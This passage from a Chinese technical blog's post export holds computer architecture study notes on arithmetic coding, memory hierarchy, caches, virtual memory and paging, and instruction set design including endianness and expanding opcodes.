编码方式：将实数集映射到实数集中，利用消息中符号集的概率在0和1之间分割实数轴。使用越频繁的符号，分割所得到的区间快越大。 举例：“HELLO WORLD!”在该语句中共有12个字符，这些符号中出现最低的概率是1/12，其他概率都是1/12的整数倍，因此可将0到1之间的区间划分为12个部分。除了L和O之外，其他每个符号都分配了1/12的区间，符号L和O则分配了3/12和2/12的区间。区间映射关系如下表符号频率区间符号频率区间D1/12[0.0…0.083)R1/12[0.667…0.750)E1/12[0.083…0.167)W1/12[0.750…0.833)H1/12[0.167…0.250)(space)1/12[0.833…0.917)L3/12[0.250…0.500)!1/12[0.917…1.0)O2/12[0.500…0.667) 通过连续划分与符号所分配区间成比例的数值范围（0.0到1.0）来对消息进行编码。例如当前区间位置为1/8，而字母L获得了1/4的当前区间，如上表，接下来对L编码，将1/8乘以1/4得到L的新的当前区间1/32。如果下一个字符是另一个字母L，则将1/32再乘以1/4得到当前的区间值1/128。这个编码过程会一直持续下去，直到整条消息编码完成。过程可用伪代码描述。 12345678910111213ALGORITHM Arith_Code( Message ) HiVal &lt;- 1.0 LoVal &lt;- 0.0 WHILE ( more characters to process ) Char &lt;- Next message character Interval &lt;- Hival - Loval CharHival &lt;- Upper interval limit for Char CharLoval &lt;- Lower interval limit for Char HiVal &lt;- Loval + Interval * CharHival LoVal &lt;- Loval + Interval * CharLoval ENDWHILE OUTPUT ( Loval )END Arith_Code 该过程用表格表示：符号区间CharLoValCharHiValLoValHiVal 0.01.0H1.00.1670.250.1670.25E0.0830.0830.1670.1738890.180861L0.0069720.250.50.17563200.1773750L0.0017430.250.50.176067750.17650350O0.000435750.50.6670.1762856250.176358395(space)0.000072770250.8330.9170.17634624260.1763523553W0.000006112700.750.8330.17635082710.1763513345O0.000000507350.50.6670.17635108080.1763511655R0.000000084730.6670.750.17635113730.176351444L0.000000007030.250.50.17635113910.1763511409D0.0000000017600.0830.17635113910.1763511392!0.000000000150.9171.00.1763511392270.176351139239 0.176351139227 Ziv-Lempel字典系统JPEG压缩专栏目录：计算机理论基础此专栏的上一篇文章：计组与体系结构笔记（五）：存储器相关此专栏的下一篇文章：操作系统（一）：概念导读 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2015/11/14/Computer-Organization-Architecture6/) 、作者信息（Forec）和本声明。","categories":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}],"tags":[{"name":"计组与体系结构","slug":"计组与体系结构","permalink":"http://forec.github.io/tags/计组与体系结构/"}],"keywords":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}]},{"title":"计组与体系结构笔记（五）","slug":"Computer-Organization-Architecture5","date":"2015-11-01T08:48:06.000Z","updated":"2016-11-22T11:07:26.000Z","comments":true,"path":"2015/11/01/Computer-Organization-Architecture5/","link":"","permalink":"http://forec.github.io/2015/11/01/Computer-Organization-Architecture5/","excerpt":"存储器类型和层次结构，高速缓存，虚拟存储器，有效组合方法。","text":"存储器类型和层次结构，高速缓存，虚拟存储器，有效组合方法。 存储器类型 高速缓存：小容量、高速度、高价格。在频繁存取数据的过程中充当一个缓冲器，高性能的高速缓存存储器会掩盖掉较慢速度的存储器系统的作用。 随机存储器（random access memory，RAM）：主存储器（primary memory），在执行程序时用来存储程序或数据。RAM是易失性存储器，存储器系统掉点时RAM中信息会全部丢失。现代计算机系统通常采用静态随机存储器（SRAM）和动态随机存储器（DRAM）存储器芯片来构造大规模RAM存储器。动态RAM由一个小电容构成，因为电容会泄露电荷，因此每隔几毫秒就需要为DRAM充电， 而静态RAM只要电源供电不断就可以维持所需要的数据。SRAM由类似D触发器的电路组成，速度比DRAM更快，价格更高。但DRAM的存储密度更高（单块芯片存储更多的位数），消耗功耗更低，比SRAM产生的热量小得多。通常将两种技术组合，DRAM用作主存储器，SRAM用作高速缓存存储器。DRAM可分多层结构的DRAM（MDRAM）、快速翻页模式（FPM）的DRAM、扩展数据输出（EDO）的DRAM、并发EDO DRAM、同步动态随机存储器（SDRAM）、同步连接的（SL）DRAM、双倍数据传送率（DDR）SDRAM以及直接RAM总线的（DR）DRAM等，其基本操作都相同。SRAM可分异步SRAM、同步SRAM和流水线并发体系结构的SRAM等。 只读存储器（read-only memory，ROM）：ROM为非易失性存储器，采用硬连线，可长久保持所存放的数据，也可应用于嵌入式系统、计算机外围设备等，如激光打印机采用ROM保存打印字符点阵。基本的ROM可分五种不同类型：ROM、PROM、EPROM、EEPROM和闪存。PROM为可编程只读存储器，内部有熔断丝，通过烧断熔断丝对芯片编程，一旦编程完成所有数据和指令都不能更改。EPROM为可擦除PROM，用发射紫外线的特殊工具将原有芯片内容擦除再重新编程。EEPROM是电可擦出PROM，芯片上的信息擦除只要施加一个电场，无需特殊工具，并且可以只擦除部分信息（一次擦除一个字节）。闪存本质为EEPROM，但可按块擦写数据，速度比EEPROM快。 存储器层次结构 采用存储器的分层组织结构，使不同层次的存储器具有不同的访问速度和存储容量。存储器分层结构系统基本类型包括：寄存器、高速缓存、主存储器、辅助存储器（硬盘、可移动存储介质等）。按存储器离开处理器的距离对存储器分类，距离按照访问存储器所需要的机器周期数目测量。存储器的技术和速度与成本一致，由于价格限制，速度快的存储器的使用数量比速度慢的存储器要少。 名词解释 命中（hit）：CPU请求的数据驻留在要访问的存储器层中。通常只在存储器的较高层才关注命中率问题。 缺失（miss）：CPU请求的数据不在要访问的存储器层。 命中率（hit rate）：访问某个特定存储器层，CPU找到所需数据的百分比。 缺失率（miss rate）：1 - 命中率。 命中时间（hit time）：在某个特定的存储器层，CPU取得所请求信息所需要的时间。 缺失损失（miss penalty）：CPU处理一次缺失时间所需要的时间，包括利用新数据块取代上层某个数据块所需要的时间、所需数据传递给处理器需要的附加时间。通常处理一次缺失事件花费的时间要比命中事件更多。 层次结构如上图所示，寄存器、1级、2级缓存和主存储器都为系统存储层，寄存器访问时间在1～2ns，1级缓存3～10ns，2级缓存25～50ns，主存储器30～90ns；硬盘为在线存储，访问速度5～20ms。除了上图表示的存储层之外，优化磁盘为近线存储，访问速度100ms～5s；磁带为离线存储，访问速度10s～3min。对于任何给定数据，处理器将访问数据请求传送给存储器中速度最快、规模最小的最高层，通常是高速缓存而不是寄存器，因为寄存器有专用用途。核心思想为：较低层的存储器系统会响应较高层的存储器对位于存储器单元X处的数据请求，同时低层存储器也会将包含地址X的整个数据块返回较高层的存储器系统。 引用的局部性：处理器倾向于以规范的方式访问存储器，例如当没有分支转移时，PC会在每次提取一条指令后自动增量+1。如果处理器在t时刻访问了存储器单元X，则很有可能在t+1时刻访问X+1。因为计算机程序对存储器引用通常有集中成组成簇的形式，所以低层存储器会将包含X的整个数据块返回高层存储器系统。如果返回的额外数据在不久的将来被引用，就可以很快装入CPU。引用的局部性有： 时间局部性（Temporal locality）：最近访问过的内容在不久的将来可能再次被访问。 空间局部性（Spatial locality）：对存储器地址空间的访问形成团簇的集中倾向（如数组或循环操作）。 顺序局部性（Sequential locality）：访问存储器的指令倾向于按顺序执行。总结：局部性原理使系统在任意给定时刻只需要访问整个存储空间中非常小的部分，而且存储在该位置的数值会被重复读取。将大量信息存储在巨大的低成本的存储器中，再将部分数据复制到容量小、速度快的高层存储器中，就可以获得与高层存储器几乎相同的访问速度。 高速缓存 不同计算机的高速缓存容量有较大差别，通常PC机的L2大小为256或512KB，位于CPU和主存储器之间。L1为32KB（以i74790为例），集成在CPU中，分数据缓存和指令缓存。高速缓存存储器不通过地址访问，而是按照内容进行存取，因此又称按内容寻址的存储器（content addressable memory，CAM），在大部分高速缓存映射策略方案中，要检查或搜索高速缓存的入口确定所需数值是否存放在告诉缓存中。 映射模式和数据访问过程 主存储器块远多于高速缓存块，主存储器块需要竞争才能获取高速缓存中的对应位置。通过对主存储器地址的各个位划分并规定特殊意义来实现地址转换，将地址的二进制位分为不同的组（2～3个地址域）。主要有直接映射、全关联、组关联等。 数据访问过程：主存储器和高速缓存的存储空间都会被划分成相同大小的字块，当生成一个存储器地址时，CPU首先搜索高速缓存存储器判断需求的数据块是否存在，找不到则将主存储器中该字所在的整个块装入高速缓存。CPU使用主存储器地址的其中一个地址域，直接给出已驻留在高速缓存的请求数据的位置，称为高速缓存命中（Cache hit）；CPU对没有驻留在高速缓存的数据，会指示出数据将要存放在高速缓存中的位置，称为高速缓存缺失（Cache miss）。接下来，CPU将检查高速缓存块的一个有效位，验证所引用的高速缓存块的合法性，若有效位合法，表示引用数据块正确，可能产生高速缓存命中，否则CPU访问主存储器。之后，CPU还会将属于改高速缓存块的标记和主存储器的标记域（主存储器地址中划分的一组二进制位，标记与对应数据块一起存放到高速缓存中）比对，匹配则产生高速缓存命中。 直接映射高速缓存二进制的主存储器地址被划分为表格中的几个域标记块字（偏移量）举例：存储器由2^14个字组成，高速缓存有16个存储空间块，每个块包含8个字，因此存储器共被分为2^11个块，每个存储器地址为14位二进制数。14位地址中，最右边三位为字域，中间4位指定高速缓存数据块（2^4=16），高7位为标记域。标记（7位）块（4位）字（偏移量），3位每个块的标记都和该块一起存放在高速缓存中，本例中主存储器的第0、2^4、…、2^(4+k)块都要映射到高速缓存中的第0块，映射时提取主存储器的块域即可决定高速缓存的位置，而标记域可以区分高速缓存的第0块是主存储器中的哪一块。整个过程无需搜索，成本低于其它种类高速缓存。缺陷：假设主存储器中的0块和16块循环调用，则每次都会产生高速缓存缺失。 全关联高速缓存：不为主存储器中的数据块唯一指定在高速缓存中的存放位置，允许主存储器的数据块存放到高速缓存的任意位置。要找到某个数据块必须搜索全部高速缓存，因此整个高速缓存需要按照关联存储器（associative memory）模式构建，以便CPU可以执行平行搜索，也就是说每次搜索操作 都需要把请求的标记与所有存放在高速缓存中的标记比对，其实现需要特殊硬件，成本较高。关联映射需要把主存储器的地址划分为标记域和字域两部分，仍然以上例举例，标记域为11位，字域为3位。对于全关联映射，如果高速缓存已满，需要一种置换算法决定从高速缓存中丢弃哪个数据块。被丢弃的块称为牺牲块。最简单的置换方法是先进先出，但现在已经较少使用。 组关联高速缓存：考虑直接映射的缺陷和全关联高速缓存的成本，将其组合成N路的组关联高速缓存映射（N-way set associative Cache mapping），映射方法类似直接映射，区别在于不是将数据块映射到高速缓存中的某一个空间块，而是映射到由几个高速缓存块组成的某个块组中。同一个高速缓存的所有组的大小必须相同。在组关联高速缓存中，主存储器地址分为标记域、组域和字域，作用类似。一个N路的组关联高速缓存，每组包含N个高速缓存块。在每组内使用关联映射方式，搜索组内全部数据，与标记域比对。 置换策略：最佳算法的目标是替换掉在未来最长时间段内不再使用的高速缓存块。实际上无法预测未来，但当某个程序运行过一次之后，就可以应用最佳算法（最佳算法无法实现，只能寻找接近最佳算法的算法）。考虑时间局部性，可以跟踪每个高速缓存块上次访问的时间，选择最近最少被使用的高速缓存块作为牺牲块，这种算法称为LRU（least recently used）算法，LRU需要系统保留每个高速缓存块的历史访问记录，因此需要较大存储空间，拖慢速度。上文的先进先出（FIFO）选取存放在高速缓存中时间最长的块作为牺牲块。随机选择可以解决LRU和FIFO遇到的“简并引用”问题，即对某个高速缓存块的重复移入移出操作，但随机选择可能将即将需要的数据丢弃，降低平均性能，并且很难有真正意义的随机置换。 有效存取时间和命中几率 分层存储器系统采用有效存取时间（EAT）量度。EAT = 命中率与相连存储器层次的相对访问时间产生的加权平均。例如假设高速缓存L2为10ns，主存储器为200ns，L2的命中率为99%，则EAT = 10×99% + 200 × 1% = 9.9ns + 2ns = 11.9ns。公式可以推广到多级存储器结构。由此可见，虽然存储器大部分采用200ns的慢速技术，但整体类似一个高效的大存储器。 高速缓存失效：如果程序的局部性不好，高速缓存会失效，并导致存储器的层次结构性能很差，尤其是面向对象编程可能导致程序的局部性不是最佳（原因待补充）。举例：访问二维数组时，数组元素通常按照行优先顺序存储，假设有一个5×4数组，数组的一个行刚好可以存放在一个高速缓存块中，而高速缓存不足以同时存放该数组所有元素，则对该数组超过20次的顺序访问中会产生5次缺失和15次命中（每次访问行首元素会导致缺失）。如果该数组是列优先存储，则会产生20次高速缓存缺失。 写策略：对高速缓存脏块的处理方案，脏块指高速缓存中已被修改过的数据块。两种基本的些策略：写通策略在每次对高速缓存的写操作时，处理器同步更新主存储器中对应的数据块。写通策略速度比回写速度满，但可以保证高速缓存与主存储器的数据始终一致。实际应用中，因为大多数存储器访问都是读操作，因此可以忽略写通策略对主存储器的写操作带来的系统速度减慢。回写策略指只有某个高速缓存块被选择为牺牲块而必须从高速缓存移出时，处理器才更新主存储器中对应的数据块。缺点在于两者数值的不同步，如果某个进程在回写主存储器之前发生中断（或崩溃），则高速缓存中数据可能丢失。 提高高速缓存命中率可以使用更好的映射算法（约+20%）、更好的写操作技巧（+15%潜在命中能力）、更好的置换算法（+10%至多）和更好的程序编码方案。例如访问二维数组，按行访问的编码方案要比按列访问的编码方案增加30%命中率。简单增加高速缓存容量大小可以增加1～4%命中率，但无法保证始终如此。 虚拟存储器 虚拟存储器使用硬盘作为RAM的扩充，增加了进程可以使用的有效地址空间。通过在硬盘开设一个区域（页文件），保持主存储器的信息块。最常用实现方法是分页机制，将主存储器和程序都划分为相同大小的块，将程序块根据需要存放到存储器块中（程序各个块可以无序存储，并且主存储器只需要存在特定片段就可以运行程序，暂时不用的程序部分存储在硬盘页文件中），因此程序的虚拟地址一旦由CPU生成，就需要转换成主存储器的物理地址。 名词解释 虚拟地址（virtual address）：进程使用的逻辑地址或程序地址。CPU生成的地址即对应虚拟地址空间。 物理地址（physical address）：物理存储器的实际地址。 映射（mapping）：将虚拟地址转换为物理地址，类似高速缓存映射。 页帧（page frame）：由主存储器分成的相等大小的信息块或数据块。 页（pages）：由虚拟存储器（逻辑地址空间）划分成的信息块或数据块，每页大小与一个页帧相同。在硬盘上存储虚拟页，供进程使用。 分页（paging）：将一个虚拟页从硬盘复制到主存储器的某个页帧。 存储碎片（fragmentation）：变得不能使用的存储器单元。 缺页（page fault）：当一个请求页在主存储器中没有找到时发生的事件。 分页 概念：按照固定大小的页帧为各个进程分配物理存储空间，用页表跟踪每个虚拟页的物理位置，每个进程都有自己的页表，页表驻留在主存储器中。页表有N行，N为该进程的虚拟页的页码数。若当前进程的某些页不在主存储器中，页表会将该页的有效位置零。通常页表还会附加一些内容，如修正位指示页中内容是否发生了改变，提高CPU进行返回页内容到硬盘的操作效率；使用位指示页的使用情况，如果处理器访问过某一页则置1，一定时间后会置零，若长时间保持0，则将该页从主存储器移出。如果程序进程并不正好占用几个页，或进程本身全部内容小于一个页的大小，则分页后会产生潜在的内部碎片，进程占用的最后一个页帧的剩余空间将被浪费。 工作原理：进程生成一个虚拟地址时，操作系统必须动态将虚拟地址转换成数据实际驻留的存储器物理地址。为简化问题，假设不存在高速缓存，从程序角度看，一个10字节程序的最后一个字节会存放在地址9，而实际可能驻留在物理存储器的1239位置（程序从1230位置开始装入）。将虚拟地址分为页域和偏移量，偏移量表示数据在页内位置。与高速缓存类似，页面大小为2的次幂，简化提取页码和偏移量的操作。流程如下：1.从虚拟地址提取页码，2.从虚拟地址提取偏移量，3.访问页表将页码转换为对应的物理页帧数，首先在页表中查找页码，之后检查该页的有效位：若有效位为0，说明产生了缺页事件，操作系统介入，在磁盘上查找到对应的页，在主存储器寻找到一个空帧（如果主存储器满，则使用置换算法移除一个牺牲页，并将牺牲页复制到硬盘），将要使用的页复制到空页帧内，并更新页表（牺牲页置零，移入页置一）；若有效位为1，则查找的页已在主存储器中，使用实际物理页帧数代替虚拟页码，加上偏移量产生物理地址。 举例：以一个真实的小系统为例，不涉及高速缓存。假设长度为15字节的程序需要访问一个按字节编址的8字节存储器，每一页的长度是两个字。程序执行时，按照以下地址引用：0，1，2，3，6，7，14。假设另一个进程正在占用主存储器的第0帧和第1帧，当请求地址0时，产生缺页事件，因此第0页中的地址0和地址1都被复制到主存储器的第2帧。请求地址1时，页1已经存在于主存储器中，因此产生一次命中。假设此时占用主存储器前两帧的进程已经结束，接着引用地址2，产生缺页事件，地址2和3所在的页1会被复制到存储器的第0帧。继续进行到访问14之前，此时主存储器已满，页表情况如图所示。最后访问地址14将产生某个牺牲页，将牺牲页替换后，主存储器中即产生了内部碎片，该页帧的第二个字节并没有被使用。假设一个更大规模的存储器系统，不考虑高速缓存。虚拟地址空间长度位为8KB字，物理存储器大小4KB字，按字节寻址，物理存储器页的大小为1KB字。虚拟存储器大小为8KB=2^13，因此虚拟地址13位，其中3位地址用作页域，共8页，每页有2^10个偏移量，对应每页有2^10个字节。物理存储器大小4KB，12位地址，2位地址作为地址域，有2^2=4个页帧。地址转换即将虚拟存储器的3位页域转换成物理存储器的2位页帧域。分页有效存取时间 处理器每次对虚拟存储器的访问都必须至少执行两次对物理存储器的访问操作，一次引用页表，一次访问要请求的实际数据。假设访问一次主存储器时间200ns，产生的缺页率为1%，处理缺页的时间为10ms，包括将缺页转移到存储器，更新页表以及引用数据所需要的总时间。该存储器的EAT = 0.99 ×（200ns+200ns）+ 0.01 ×（10ms + 200ns）= 100398ns。即使缺页率为0，有效存取时间仍为400ns，是存储器访问时间的两倍，原因在于页表存储在主存储器中。 转换旁视缓冲器（translation look-aside buffer，TLB）：存放最近的页查询数据值，可以加速页表查询时间。每个TLB入口目录由一个虚拟页页码和对应的物理页帧帧数组成，使用关联高速缓存实现TLB。使用TLB的一个查询过程为：1.从虚拟地址提取页码和偏移量，2.在TLB中搜索虚拟页码，3.如TLB中找到虚拟页码和物理帧数对，则将偏移量加上物理帧数产生实际物理地址，直接访问该存储单元，4.如发生TLB缺失，则处理器重复分页存储器的流程，并更新TLB。 分页虚拟存储的优缺点：查找页表实现地址转换需要较大开销，需要额外空间存储页表，需要专门的硬件和操作系统支持。优点在于可以允许系统运行虚拟地址空间比实际物理存储器空间大的多得程序，允许进程和进程自身分享物理存储器，使用固定大小的页帧简化存储器空间的分配和地址安排问题。 分段 分段机制不把虚拟地址空间和物理地址空间划分为相等的固定大小的页和页帧，而是将虚拟地址空间划分为多个可变长度的逻辑单元，称为段。物理存储器不再进行实际的空间分割。当需要将某个段复制到物理存储器时，操作系统查找足够大的自由存储空间存储整个段。每个段都有一个表示该段在存储器中位置的基地址和一个指示段的大小的界限。每个程序由若干个段组成，每个程序也有一个相应的段表，段表包含每个段的基地址和界限对的集合，只要提供段的基地址和段内偏移量即可转换存储器访问。使用分段更容易实现存储空间的保护和共享：例如一个程序的虚拟地址空间可以分为代码段、数据段、堆栈段和符号表段，每个段大小长度各不相同，用户可以很方便的选择数据段共享出去。 外部碎片：分段机制不存在内部碎片问题，但在分段配置和解除分段时，存储器中的自由空间块会变的残缺不完整，最后存储器会留下许多长度较小的自由空间块，不足以存放一个整程序段。但对于外部碎片，存储器上总的空间足够分配给一个程序进程使用，但这个存储空间是不连续的，因此可以通过碎片收集，对存储空间上已经占用的信息块进行重新调整。而对于内部碎片，无法使用多余的空间。 分段和分页组合：使用分页更容易管理，不存在外部碎片问题，但需要更多系统开销；使用分段可以避免内部碎片问题，支持段的共享和保护。在组合方式中，虚拟地址空间被分割为长度可变的段，段内分为固定大小的页面，主存储器的物理空间对等的划分为相等大小的帧。每个段都有一个页表，每个程序有多个页表，系统的物理地址划分为三个域，段域指示系统对应段表，页域用作进入页表的偏移量，第三个域为页内偏移量。 存储器管理 奔腾处理器的存储器管理：奔腾为32位虚拟地址和32位物理地址，分页大小为4KB或4MB，采用分页和分段管理机制的不同组合：包括没有分段和分页的存储器，只有分页的存储器，只有分段的存储器以及二者兼有的存储器。其采用两级高速缓存：L1和L2，都使用一个32位大小的存储区块。L1靠近处理器，L2位于处理器和存储器之间。L1被分割为保存指令的高速缓存（I-Cache）和保存数据的高速缓存（D-Cache）。两个L1 Cache都使用一个LRU位处理置换操作。每个L1有一个TLB，D-Cache的TLB有64个入口目录，I-Cache只有32个入口目录。两个TLB都采用4路的组关联映射方式。L2的规模从512KB（早期）增加到1MB（后期型号）。L2 Cache和两个L1 Cache都采用2路组关联映射方式，都采用MESI高速缓存的一致性协议，每一路高速缓存线都使用2位二进制数存储下列MESI状态中的一种：1）M：高速缓存中数据被修改，与主存储器中不同，2）E：独占的，高速缓存数据没有被修改过，与主存储器相同，3）S：共享的，高速缓存的线/块可以呵其他高速缓存的线/块共享，4）I：无效的，所请求的线/块不在高速缓存中。 专栏目录：计算机理论基础此专栏的上一篇文章：计组与体系结构笔记（四）：指令系统此专栏的下一篇文章：计组与体系结构笔记（六）：输入/输出与存储系统 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2015/11/01/Computer-Organization-Architecture5/) 、作者信息（Forec）和本声明。","categories":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}],"tags":[{"name":"计组与体系结构","slug":"计组与体系结构","permalink":"http://forec.github.io/tags/计组与体系结构/"}],"keywords":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}]},{"title":"计组与体系结构笔记（四）","slug":"Computer-Organization-Architecture4","date":"2015-10-27T03:08:53.000Z","updated":"2016-11-22T11:07:18.000Z","comments":true,"path":"2015/10/27/Computer-Organization-Architecture4/","link":"","permalink":"http://forec.github.io/2015/10/27/Computer-Organization-Architecture4/","excerpt":"指令系统体系结构概览（C05）。","text":"指令系统体系结构概览（C05）。 指令系统设计 每条计算机指令均有一个操作码和0或多个操作数。前章的MARIE指令长度为16位，至多只有一个操作数。根据ISA的不同，指令使用的二进制位数也可能不同（16位，32位，64位），每条指令允许使用的操作数的个数可能不同，指令类型和指令处理的操作数的类型也可能不同。具体在特征上可能存在以下差别：1）操作数在CPU中的存储方式（堆栈结构或寄存器）；2）指令直接作用的操作数数目（常用的操作数个数为0，1，2，3）；3）操作数的位置（寄存器-寄存器，寄存器-存储器，存储器-存储器）；4）操作（操作类型，指令是否可以访问存储器）；5）操作数的类型和长度。 衡量标准 ISA的效能通过以下因素衡量：程序执行指令时占用内存空间的大小；指令系统复杂程度，主要指指令执行所需要的译码数量和指令所执行任务的复杂性；指令长度；指令系统中指令的总数目。 指令一般越短越好，较短的指令占用较少的内存空间，并且提取指令速度更快。但采取短指令会限制指令的数量（受到能够编码的二进制数的位数限制），同样也会限制操作数的大小和数量。 固定长度的指令的译码容易但浪费空间，但固定长度的指令系统不表示必须使用固定数量的操作数。可以设计一个指令总长度固定的ISA，但可以允许其操作数域的位数根据需要改变，称为拓展操作码（expanding opcode）。 存储器的组成形势会影响指令的格式。如果存储器为16或32位字，如果不是按字节编址则很难访问到一个单一字符，因此有些16/32/64位机器也是按照字节编址。 存在多种不同类型的寻址方法；字节存储的小端大端位序问题；ISA需要多少寄存器并如何组织这些寄存器。 小端和大端位序问题 位端（endian）指的是计算机体系结构中的“位序”（byte order），即计算机存储一个多字节数据时，多个字节的排列方式。当今所有的计算机体系结构都是按字节编址，对于存储一个2字节整数，将低位的字节首先存放到低位地址，高位字节存放到高位地址，此时较低地址的字节就是数据的低位，这种方式称为小端（little-endian）；对于低位地址存放高位数据的方式称为大端（big-endian）。大部分UNIX计算机和新式RISC体系结构为大端机器，PC计算机为小端机器。Intel总是使用小端方式设计机器，而Motorola总采用大端。有的CPU既可以处理小端问题也可以处理大端问题。 将32位16进制数据12345678存储在地址0的存储单元，每个十六进制数字需要半字节。对应两种不同的存储方式列出下表。编址————&gt;00011011大端位序12345678小端位序78563412 大端位序存储方式更自然，便于阅读16进制编写的程序端。可以通过检查最高位的符号位判读数字正负，而小端需要知道数值长度，再跳过中间字节找到最高位。大端位序的机器存储整数和字符串采用相同次序，在某些字符串操作时更快。大部分位图映射格式图像都采用“最高位在字符串左边”的变换方法，即对于像素大于一个字节的数据可以直接按照大端位序处理，因此对于小端位序在处理较大图形对象时可能会性能受限。当对采用例如赫夫曼和LZW这类编码的压缩数据译码时，若数据采用大端位序存储，则实际的编码字可以被当作进入到某个查询表中的一个索引使用。 小端位序在高精度算术运算上速度更快更方便。大部分采用大端位序的体系结构都不允许计算机字按照非字地址边界的方法写数据字，例如一个字由2或4字节组成，写数据字时必须从偶数编号的字节地址开始，浪费空间。小端机器允许进行奇数地址的读写。 计算机网络都采用大端位序的体系结构。如果小端位序的机器要将整数数据（如网络设备地址）传送到网络上，必须将数据转换成网络要求的字节次序，从网络上接收数据时也需要将这些数据转换成本地表示形式。BMP图形格式是小端位序，如果在大端位序机器上查看BMP图形必须先反转数据位序。Adobe Photoshop采用大端格式，GIF是小端格式，JPEG是大端格式，Macpaint使用大端格式，PC Paintbrush是小端格式，RTP使用小端位序，Sun光栅文件是大端格式。WAV、AVI、TIFF、XWD等同时支持两种格式。 堆栈和寄存器 CPU数据存储方式是区分不同指令系统体系结构的最基本方法。包含：堆栈体系结构，累加器体系结构和通用寄存器（GPR）体系结构。 堆栈体系结构（stack architecture）的计算机使用一个堆栈来执行各种指令，指令的操作数隐含的存放在堆栈顶部。按照堆栈体系结构设计的机器通常具有好的编码密度和一个简单的表达式估值模型。但因为不能对堆栈进行随机访问，使得采用堆栈结构的机器很难产生高效率的编码。如果存储器速度快，使用堆栈体系结构较好。 累加器体系结构（Accumulator architecture）计算机，如MARIE，将其中一个操作数隐含在累加器中，最大限度地降低机器内部复杂性，并且允许使用非常短的指令。由于累加器只是临时存储，需要对存储器的访问非常频繁。 通用寄存器体系结构（general purpose register architecture）计算机，采用多个通用寄存器组，是当今计算机体系结构最广泛的模型。寄存器组的访问速度比存储器快得多，也方便编译器处理。由于硬件价格急剧下降，现在可以以较小成本增加大量数目的寄存器。如果存储器速度较慢，通常采用通用寄存器体系结构。但由于所有操作数必须加以命名，因此使用寄存器结构会产生较长指令，导致较长的取指和译码时间。对ISA设计人员来说，实现短指令是一个非常重要的目标。通用寄存器体系结构可以根据指令的操作数所处的位置分成三种类型。 存储器-存储器（memory-memory）体系结构可以有两个或三个操作数位于存储器内，允许有一条执行某种操作而不需要有任何操作数的指令存放在某个寄存器中。 寄存器-存储器（register-memory）体系结构采用混合方式，要求至少有一个操作数在寄存器中和一个操作数在存储器中。 装入-存储（load-store）体系结构需要在任何对数据的操作前把数据装入寄存器中。Intel和Motorola的计算机属于寄存器-存储器体系结构，数字仪器公司的VAX计算机体系结构实行的是存储器-存储器操作，SPARC、MIPS、ALPHA和PowerPC都是装入-存储式体系结构计算机。 操作数的数目和指令长度 描述计算机体系结构的传统方法是制定每条指令中所包含的操作数，或者说地址的最大数目。 MARIE采用固定长度的指令，包括4位操作码和12位操作数。在现在的计算机体系结构中，指令构成的格式有固定长度和可变长度两种。 固定长度（fixed length）：会浪费一定存储空间，但执行速度更快。在采用指令层次的流水线结构时性能更好。 可变长度（variable length）：译码复杂，但节省存储空间。实际设计中，通常会采用两到三种不同的指令长度，这样可以有不同的位的指令组合形式，便于简化指令的区分和译码。指令的长度必须配合机器字的长度，如果指令的长度严格等于机器字的长度，则将指令存储到主存储器时，指令间的对齐问题就会非常完美。因为存储器要编址，因此采用实际机器字长度的1/4，1/2，2倍或3倍长度的指令会浪费不少的存储空间。可变长度的指令同样也会造成存储空间的浪费。 最常用的指令格式包括0，1，2或3个操作数。通常情况下，算术运算或逻辑运算需要2个操作数，如果将累加器作为一个隐藏的操作数，则两个操作数的操作可以按照一个操作数指令的方式执行。同理，使用一个堆栈结构可以允许有不带操作数的指令。只有操作码0地址操作码+1个地址通常只有一个存储器地址操作码+2个地址通常两个寄存器地址，或一个寄存器地址加上一个存储器地址操作码+3个地址通常是三个寄存器地址或寄存器和存储器的某种组合 对每种体系结构来说，每条指令允许的最大操作数的数目是有限制的。不带操作数的机器指令必须使用堆栈来执行在逻辑上需要一个或两个操作数的操作。对于两个操作数的操作，堆栈结构采用堆栈顶部最上面的两个元素作为操作数。如Add指令，将栈顶两个元素相加并弹出，再将求和结果压入堆栈顶部。对于操作次序不能交换的各种操作，同样对堆栈顶部最上面的两个数据元素按次序进行。这种组成结构对于反向波兰表达式（reverse Polish notation，RTN）编写的长算术表达式非常有效，逆波兰表示法将保持计算次序的括号都消除了。Z = ( X × Y ) + ( W × U )3个操作数Mult R1, X, Y; Mult R2, W, U; Add Z, R2, R12个操作数Load R1, X; Mult R1, Y; Load R2, W; Mult R2, U; Add R1, R2; Store Z, R11个操作数Load X; Mult Y; Store Temp; Load W; Mult U; Add Temp; Store Z0个操作数Push X; Push Y; Mult; Push W; Push U; Mult; Add; Pop Z 扩展操作码（expanding opcode）代表一种折衷方案，及要求有尽可能多的操作码，又要求采用尽可能短的操作码。设计思想是：选用短操作码，而有需要时可以有某种方法将操作码加长。如果使用短操作码就留给操作数大量的指令位，因此每条指令可以有2～3个操作数；若指令不需要操作数（如halt），或计算机使用堆栈操作，则指令所有位都可用于操作码，生成独特指令。假设计算机具有16位指令系统和16个寄存器，因此指令用4个二进制位就可以指定其中的某个寄存器。如果使用4位操作码，剩下12位作为存储器地址，就像MARIE一样，寻址范围可达2^12 = 4KB。但如果所有数据都被预先装入寄存器，则可以将12位地址分成3个寄存器地址。举例说明：用16位编码产生1）15条3地址指令，2）14条2地址指令，3）31条1地址指令，4）16条0地址指令。15个3地址编码0000 R1 R2 R3; ··· ; 1110 R1 R2 R314个2地址编码1111 0000 R1 R2; ··· ; 1111 1101 R1 R231个1地址编码1111 1110 0000 R1; ··· ; 1111 1111 1110 R116个0地址编码1111 1111 1111 0000; ··· ; 1111 1111 1111 1111扩展操作码的译码更复杂，对于例子而言，需要采用类似下面方式译码。 12345678if ( leftmost four bits != 1111 ) Execute appropriate three-address instructionelse if ( leftmost seven bits != 1111 111 ) Execute appropriate two-address instructionelse if ( left most twelve bits != 1111 1111 1111 ) Execute appropriate one-address instructionelse Execute appropriate zero-address instruction 指令类型 